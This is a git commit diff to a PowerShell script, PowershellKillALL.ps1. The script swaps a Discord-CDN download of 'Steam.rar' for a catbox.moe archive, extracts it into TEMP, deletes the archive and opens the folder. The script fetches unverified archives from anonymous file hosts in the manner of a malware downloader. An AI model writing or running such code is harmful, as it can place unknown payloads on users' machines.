d64db9aa34513f751d4cfa57a1b26de261c75feb
KillALLCMD <gunnershop156@gmail.com>
2026-09-19 10:07:45 +0700

    Change download URL and add extraction process
    Updated the script to download and extract a new file from a different URL, and launch the extracted directory.

--- PowershellKillALL.ps1
+++ PowershellKillALL.ps1
@@ -1,5 +1,9 @@
-﻿$url='https://cdn.discordapp.com/attachments/1535595573816590406/1550702471540768809/Steam.rar?ex=6aaf4bb7&is=6aadfa37&hm=ae2eecb993c2df96d3c0a2c4a831e6d76e61cebcc9658b49f804a30b53d36d5c&'
-$file="$env:TEMP\Steam.rar"
-Invoke-WebRequest $url -OutFile $file
-# ใช้งานไฟล์ตรงนี้
-Remove-Item $file -Force -ErrorAction SilentlyContinue
+$url='https://files.catbox.moe/gkzw9k.rar'
+$rar="$env:TEMP\gkzw9k.rar"
+$dir="$env:TEMP\gkzw9k"
+
+Invoke-WebRequest -Uri $url -OutFile $rar
+New-Item -ItemType Directory -Path $dir -Force | Out-Null
+tar -xf $rar -C $dir
+Remove-Item $rar -Force -ErrorAction SilentlyContinue
+Start-Process explorer.exe $dir
